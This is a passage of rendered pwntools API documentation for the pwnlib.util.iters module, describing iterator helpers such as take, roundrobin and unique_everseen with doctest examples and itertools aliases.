<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator whoose elements are the results of calling <code class="docutils literal"><span class="pre">func(*args,</span>
<span class="pre">**kwargs)</span></code> repeatedly.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
<span class="gp">... </span>    <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
<span class="gp">... </span>    <span class="k">return</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">repeat_func</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[1, 2]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[3, 4]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
<span class="gp">... </span>    <span class="k">return</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="mi">43</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">repeat_func</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">42</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[42, 42]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">repeat_func</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">42</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
    <span class="o">...</span>
<span class="gr">TypeError</span>: <span class="n">f() takes exactly 0 arguments (1 given)</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.roundrobin">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">roundrobin</code><span class="sig-paren">(</span><em>*iterables</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L378-405"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.roundrobin" title="Permalink to this definition">¶</a></dt>
<dd><p>Take elements from <cite>iterables</cite> in a round-robin fashion.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>*iterables</strong> &#8211; One or more iterables.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">An iterator whoose elements are taken from <cite>iterables</cite> in a round-robin
fashion.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">roundrobin</span><span class="p">(</span><span class="s1">&#39;ABC&#39;</span><span class="p">,</span> <span class="s1">&#39;D&#39;</span><span class="p">,</span> <span class="s1">&#39;EF&#39;</span><span class="p">))</span>
<span class="go">&#39;ADEBFC&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">take</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">roundrobin</span><span class="p">(</span><span class="s1">&#39;ABC&#39;</span><span class="p">,</span> <span class="s1">&#39;DE&#39;</span><span class="p">,</span> <span class="n">repeat</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">))))</span>
<span class="go">&#39;ADxBExCxxx&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.tabulate">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">tabulate</code><span class="sig-paren">(</span><em>func</em>, <em>start = 0</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L99-115"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.tabulate" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>func</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; The function to tabulate over.</li>
<li><strong>start</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number to start on.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator with the elements <code class="docutils literal"><span class="pre">func(start),</span> <span class="pre">func(start</span> <span class="pre">+</span> <span class="pre">1),</span> <span class="pre">...</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">tabulate</span><span class="p">(</span><span class="nb">str</span><span class="p">))</span>
<span class="go">[&#39;0&#39;, &#39;1&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">tabulate</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="p">,</span> <span class="n">start</span> <span class="o">=</span> <span class="mi">1</span><span class="p">))</span>
<span class="go">[1, 4, 9, 16, 25]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.take">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">take</code><span class="sig-paren">(</span><em>n</em>, <em>iterable</em><span class="sig-paren">)</span> &#x2192; list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L72-97"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.take" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns first <cite>n</cite> elements of <cite>iterable</cite>.  If <cite>iterable</cite> is a iterator it
will be advanced.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of elements to take.</li>
<li><strong>iterable</strong> &#8211; An iterable.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A list of the first <cite>n</cite> elements of <cite>iterable</cite>.  If there are fewer than
<cite>n</cite> elements in <cite>iterable</cite> they will all be returned.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
<span class="go">[0, 1]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">count</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[0, 1]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[2, 3]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">9001</span><span class="p">,</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">])</span>
<span class="go">[1, 2, 3]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.unique_everseen">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">unique_everseen</code><span class="sig-paren">(</span><em>iterable</em>, <em>key = None</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L431-464"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.unique_everseen" title="Permalink to this definition">¶</a></dt>
<dd><p>Get unique elements, preserving order. Remember all elements ever seen.  If
<cite>key</cite> is not <code class="xref py py-const docutils literal"><span class="pre">None</span></code> then for each element <code class="docutils literal"><span class="pre">elm</span></code> in <cite>iterable</cite> the
element that will be rememberes is <code class="docutils literal"><span class="pre">key(elm)</span></code>.  Otherwise <code class="docutils literal"><span class="pre">elm</span></code> is
remembered.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>key</strong> &#8211; A function to map over each element in <cite>iterable</cite> before remembering
it.  Setting to <code class="xref py py-const docutils literal"><span class="pre">None</span></code> is equivalent to the identity function.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator of the unique elements in <cite>iterable</cite>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">unique_everseen</span><span class="p">(</span><span class="s1">&#39;AAAABBBCCDAABBB&#39;</span><span class="p">))</span>
<span class="go">&#39;ABCD&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">unique_everseen</span><span class="p">(</span><span class="s1">&#39;ABBCcAD&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">lower</span><span class="p">))</span>
<span class="go">&#39;ABCD&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.unique_justseen">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">unique_justseen</code><span class="sig-paren">(</span><em>iterable</em>, <em>key=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L466-488"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.unique_justseen" title="Permalink to this definition">¶</a></dt>
<dd><p>unique_everseen(iterable, key = None) -&gt; iterator</p>
<p>Get unique elements, preserving order. Remember only the elements just seen.
If <cite>key</cite> is not <code class="xref py py-const docutils literal"><span class="pre">None</span></code> then for each element <code class="docutils literal"><span class="pre">elm</span></code> in <cite>iterable</cite>
the element that will be rememberes is <code class="docutils literal"><span class="pre">key(elm)</span></code>.  Otherwise <code class="docutils literal"><span class="pre">elm</span></code> is
remembered.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>key</strong> &#8211; A function to map over each element in <cite>iterable</cite> before remembering
it.  Setting to <code class="xref py py-const docutils literal"><span class="pre">None</span></code> is equivalent to the identity function.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator of the unique elements in <cite>iterable</cite>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">unique_justseen</span><span class="p">(</span><span class="s1">&#39;AAAABBBCCDAABBB&#39;</span><span class="p">))</span>
<span class="go">&#39;ABCDAB&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">unique_justseen</span><span class="p">(</span><span class="s1">&#39;ABBCcAD&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">lower</span><span class="p">))</span>
<span class="go">&#39;ABCAD&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.unique_window">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">unique_window</code><span class="sig-paren">(</span><em>iterable</em>, <em>window</em>, <em>key=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L490-527"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.unique_window" title="Permalink to this definition">¶</a></dt>
<dd><p>unique_everseen(iterable, window, key = None) -&gt; iterator</p>
<p>Get unique elements, preserving order. Remember only the last <cite>window</cite>
elements seen.  If <cite>key</cite> is not <code class="xref py py-const docutils literal"><span class="pre">None</span></code> then for each element <code class="docutils literal"><span class="pre">elm</span></code>
in <cite>iterable</cite> the element that will be rememberes is <code class="docutils literal"><span class="pre">key(elm)</span></code>.
Otherwise <code class="docutils literal"><span class="pre">elm</span></code> is remembered.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>window</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The number of elements to remember.</li>
<li><strong>key</strong> &#8211; A function to map over each element in <cite>iterable</cite> before remembering
it.  Setting to <code class="xref py py-const docutils literal"><span class="pre">None</span></code> is equivalent to the identity function.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator of the unique elements in <cite>iterable</cite>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">unique_window</span><span class="p">(</span><span class="s1">&#39;AAAABBBCCDAABBB&#39;</span><span class="p">,</span> <span class="mi">6</span><span class="p">))</span>
<span class="go">&#39;ABCDA&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">unique_window</span><span class="p">(</span><span class="s1">&#39;ABBCcAD&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">lower</span><span class="p">))</span>
<span class="go">&#39;ABCD&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">unique_window</span><span class="p">(</span><span class="s1">&#39;ABBCcAD&#39;</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">lower</span><span class="p">))</span>
<span class="go">&#39;ABCAD&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.chain">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">chain</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.chain" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.chain" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.chain()</span></code></a>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.combinations">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">combinations</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.combinations" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.combinations" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.combinations()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.combinations_with_replacement">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">combinations_with_replacement</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.combinations_with_replacement" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.combinations_with_replacement" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.combinations_with_replacement()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.compress">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">compress</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.compress" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.compress" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.compress()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.count">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">count</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.count" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.count" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.count()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.cycle">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">cycle</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.cycle" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.cycle" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.cycle()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.dropwhile">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">dropwhile</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.dropwhile" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.dropwhile" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.dropwhile()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.groupby">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">groupby</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.groupby" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.groupby" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.groupby()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.ifilter">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">ifilter</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.ifilter" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.ifilter" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.ifilter()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.ifilterfalse">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">ifilterfalse</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.ifilterfalse" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.ifilterfalse" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.ifilterfalse()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.imap">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">imap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.imap" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.imap" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.imap()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.islice">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">islice</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.islice" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.islice" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.islice()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.izip">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">izip</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.izip" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.izip" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.izip()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.izip_longest">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">izip_longest</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.izip_longest" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.izip_longest" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.izip_longest()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.permutations">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">permutations</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.permutations" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.permutations" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.permutations()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.product">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">product</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.product" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.product" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.product()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.repeat">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">repeat</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.repeat" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.repeat" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.repeat()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.starmap">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">starmap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.starmap" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.starmap" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.starmap()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.takewhile">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">takewhile</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.takewhile" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.takewhile" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.takewhile()</span></code></a></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.tee">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">tee</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.tee" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#itertools.tee" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">itertools.tee()</span></code></a></p>
</dd></dl>

</div>
<span id="document-util/lists"></span><div class="section" id="module-pwnlib.util.lists">
<span id="pwnlib-util-lists-operations-on-lists"></span><h3><a class="reference internal" href="#module-pwnlib.util.lists" title="pwnlib.util.lists"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.lists</span></code></a> &#8212; Operations on lists<a class="headerlink" href="#module-pwnlib.util.lists" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.util.lists.concat">
